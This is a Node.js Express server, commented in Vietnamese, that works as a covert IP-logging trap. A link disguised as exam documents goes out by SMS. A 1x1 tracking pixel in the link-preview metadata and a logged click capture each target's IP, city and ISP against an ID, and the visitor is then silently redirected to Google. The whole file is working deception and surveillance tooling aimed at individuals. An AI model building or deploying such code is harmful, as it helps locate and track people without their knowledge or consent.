const express = require('express');
const app = express();

// Hàm lấy vị trí từ IP
async function getIPInfo(ip) {
  try {
    const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,query`);
    const data = await res.json();
    if (data.status === 'success') {
      return `📍 Vị trí: ${data.city}, ${data.regionName}\n📡 Nhà mạng: ${data.isp}`;
    }
    return "📍 Không rõ vị trí";
  } catch (e) { return "📍 Lỗi API"; }
}

// Hàm lọc Bot (Apple, Google, Zalo) để không bị nhiễu log
function isBot(userAgent) {
  return /googlebot|applebot|zalo|facebook|telegrambot|bot|crawler/i.test(userAgent);
}

// Lấy IP thật (xử lý qua proxy của Render)
function getRealIP(req) {
  return (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
}

// 1. TRANG BẪY CHÍNH (Gửi link này qua SMS)
app.get('/bai-thi/:id', async (req, res) => {
  const ip = getRealIP(req);
  const userAgent = req.headers['user-agent'] || '';

  // Nếu là Bot quét link preview -> Trả về HTML có thẻ ảnh bẫy
  if (isBot(userAgent)) {
    return res.send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Tài liệu bài thi</title>
        <meta property="og:image" content="https://ip-logger-yanx.onrender.com/bay.png?id=${req.params.id}">
      </head>
      <body>Đang tải dữ liệu...</body>
      </html>
    `);
  }

  // Nếu là người thật bấm vào
  const info = await getIPInfo(ip);
  console.log(`\n🚨🚨🚨 [NGƯỜI THẬT BẤM LINK] 🚨🚨🚨`);
  console.log(`🆔 Mã ID: ${req.params.id}`);
  console.log(`🌐 IP: ${ip}`);
  console.log(info);
  console.log(`=========================================\n`);
  
  res.redirect(302, 'https://google.com');
});

// 2. ĐƯỜNG DẪN ẢNH BẪY (Nơi hứng IP của Android tự động tải)
app.get('/bay.png', async (req, res) => {
  const ip = getRealIP(req);
  const id = req.query.id || 'Không rõ';
  
  // Trả về một bức ảnh trong suốt 1x1 pixel
  const pixel = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=', 'base64');
  res.set('Content-Type', 'image/png');
  res.send(pixel);

  // In log ra màn hình Render
  getIPInfo(ip).then(info => {
    console.log(`\n📱📱📱 [BẮT ĐƯỢC IP QUA SMS PREVIEW] 📱📱📱`);
    console.log(`🆔 Mã ID: ${id}`);
    console.log(`🌐 IP: ${ip}`);
    console.log(info);
    console.log(`⚠️ (Lưu ý: Nếu vị trí là Mỹ/Google thì đây là IP của Google Proxy, không phải IP thật)`);
    console.log(`=========================================\n`);
  });
});

const port = process.env.PORT || 3000;
app.listen(port, () => console.log("Server chạy cổng " + port));
